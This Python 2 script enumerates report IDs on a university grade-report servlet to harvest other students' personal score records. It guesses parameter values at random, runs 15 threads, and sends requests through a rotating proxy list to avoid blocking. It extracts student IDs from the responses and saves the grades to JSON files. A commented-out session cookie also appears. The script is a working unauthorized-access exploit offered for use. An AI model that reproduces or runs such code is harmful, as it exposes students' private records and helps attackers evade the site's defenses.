#!/bin/python2
#-*- coding=utf-8 -*-
'''
  author: atupal
  2013.7.21
'''

#import requests,
import time
import re
import threading
from Queue import Queue
import json
from random import randint as rand
import urllib2, random
import ConfigParser
import io
import traceback, sys


config = r'''
[base]
url=http://bksjw.hust.edu.cn/reportServlet

[param]
action=18
file_grade=student_personal_score_grade.raq
file_all=student_personal_score_all.raq
srcType=file
separator=%09
saveAsName=none
cachedId=A_1392

[bool]
get_all=false

[other]
#seed=97895
seed=101358
use_proxy=true
'''


score_set = dict()
dictlock = threading.Lock()
id_set = set()
queue = Queue()

conf = ConfigParser.RawConfigParser(allow_no_value=True)
conf.readfp( io.BytesIO(config) )
exitapp = False

if conf.get('bool', 'get_all').lower() == 'true':
  _file = './score.json'
else:
  _file = './score_grade.json'

class Resp(object):
  def __init__(self, content):
    self.content = content

with open('./proxy.lst') as fi:
  proxies = [_.rstrip('\n') for _ in fi]

def download(ID, C_ID, TIME):
  #url = ('http://bksjw.hust.edu.cn/reportServlet?action=18&file=student_personal_score_grade' +
  #'.raq&srcType=file&separator=%09&reportParamsId=' + str(ID)
  #+ '&saveAsName=&cachedId=A_5%d&t_i_m_e=%d' % (rand(300, 600), time.time() * 1000) )

  if conf.get('bool', 'get_all').lower() == 'true':
    file_ = conf.get('param', 'file_all')
  else:
    file_ = conf.get('param', 'file_grade')

  url = '%s?action=%s&file=%s&srcType=%s&separator=%s&reportParamsId=%s&saveAsName=%s&cachedId=A_%d&t_i_m_e=%d' % (
      conf.get('base', 'url'),
      conf.get('param', 'action'),
      file_,
      conf.get('param', 'srcType'),
      conf.get('param', 'separator'),
      str(ID),
      conf.get('param', 'saveAsName'),
      #rand(765, 766),
      C_ID,
      #time.time() * 1000,
      TIME,
      )

  headers = {
      #'cookie': 'usertype=xs; hub_service=Fjde1oXdvHjTn3JXXgIw+dpmaj1+eZxJvJXv6KIko0d/eb+2Y/Gq0P8D/T3aNoN9thW1eh7A7mtj0g==; JSESSIONID=0000Z6YRuKLmWMoaZ4xaKV2i-ma:166nc7rnq'
      }

  #resp = requests.get(url, headers = headers)
  #if resp.status_code != 200:
  #  print 'watting 1 min'
  #  time.sleep(60)

  #url = 'http://bksjw.hust.edu.cn:80/reportServlet?action=18&file=student_personal_score_grade.raq&srcType=file&separator=%09&reportParamsId=103997&saveAsName=%7Cu534E%7Cu4E2D%7Cu79D1%7Cu6280%7Cu5927%7Cu5B66%7Cu62A5%7Cu8868&cachedId=A_14870&t_i_m_e=1374721017793'


  opener = urllib2.build_opener( urllib2.ProxyHandler({'http': random.choice(proxies)}) )
  resp = Resp('nothing')
  try:
    if conf.get('other', 'use_proxy').lower() == 'true':
      resp = Resp( opener.open(url, timeout = 5).read()  )
    else:
      resp = Resp( urllib2.urlopen(url, timeout = 5).read()  )
  except:
    pass

  if '201110090' not in resp.content and 'script' not in resp.content:
    pat = r'''U([0-9]{9,9})'''
    ret = re.findall(pat, resp.content)
    if len(ret) > 0 and str(ret[0]) not in id_set and str(ret[0]) not in score_set:
      print '\033[31mget\n %s' % (ret[0])
      print '\033[32m %s' % resp.content.decode('gbk')
      score_set[ ret[0] ] = resp.content.decode('gbk')
    else:
      if ret:
        print '\033[33m already get:%s' % (ret[0]),
        score_set[ ret[0] ] = resp.content.decode('gbk')


def update_id():
  with open(_file, 'r') as fi:
    score = json.loads("["  +  fi.read().strip().strip(',').strip('\n').strip(',')  +  "]" )
    for s in score:
      for ss in s:
        id_set.add(str(ss))

    print 'crawler count: %d' % len(id_set)


class Crawler(threading.Thread):
  def __init__(self, queue):
    threading.Thread.__init__(self)
    self.queue = queue

  def stop(self):
    self._Thread__stop()

  def run(self):
    while not exitapp:
      task = queue.get()
      try:
        time.sleep(0.1)
        download(task[0], task[1], task[2])
        print '\033[32m %s' % str(task),
        if len(score_set) > 10:
          dictlock.acquire()
          try:
            with open(_file, 'aw') as fi:
              fi.write(",\n\n" + json.dumps(score_set, indent = 2))
              fi.flush()
              score_set.clear()
          finally:
            update_id()
            dictlock.release()
      except Exception as e:
        if 'HTTPConnectionPool' in str(e):
          print 'waiting 1 min'
          time.sleep(60)
        else:
          traceback.print_exc(file = sys.stdout)
      finally:
        self.queue.task_done()


class add_task(threading.Thread):

  def __init__(self):
    threading.Thread.__init__(self)

  def stop(self):
    self._Thread__stop()

  def run(self):
    c = ConfigParser.RawConfigParser(allow_no_value=True)
    c.readfp(open('config.cfg'))
    while not exitapp:
      rep_id_base = int(c.get('rep', 'base'))
      rep_id_seed = int(c.get('rep', 'seed'))
      c_id_base = int(c.get('cid', 'base'))
      c_id_seed = int(c.get('cid', 'seed'))
      TIME = c.get('time', 'base')
      time_seed = int(c.get('time', 'seed'))
      if TIME:
        TIME = int(TIME)
      else:
        TIME = time.time() * 1000
      if queue.qsize() < 300:
        for i in xrange(1, 600, 1):
          queue.put( (  rep_id_base + rand(-rep_id_seed, rep_id_seed) ,  c_id_base + rand(-c_id_seed,c_id_seed),  TIME + rand(-time_seed,  time_seed)) )
      time.sleep(6)


if __name__ == "__main__":
  update_id()
  #base = 103608
  ##seed = 90000 #seed = 100
  #for  i in xrange(1, seed, 1):
  #  queue.put(base + i)
  #  queue.put(base - i)

  worker = add_task()
  worker.setDaemon(True)
  worker.start()

  crawlers = []

  for i in xrange(15):
    crawler = Crawler(queue)
    crawler.setDaemon(True)
    crawlers.append(crawler)
    crawler.start()

  print 'begin crawler!'
  try:
    queue.join()
  except KeyboardInterrupt:
    with open(_file, 'aw') as fi:
      fi.write(",\n\n" + json.dumps(score_set, indent = 2))
      fi.flush()
      score_set.clear()
    exitapp = True
    exit()
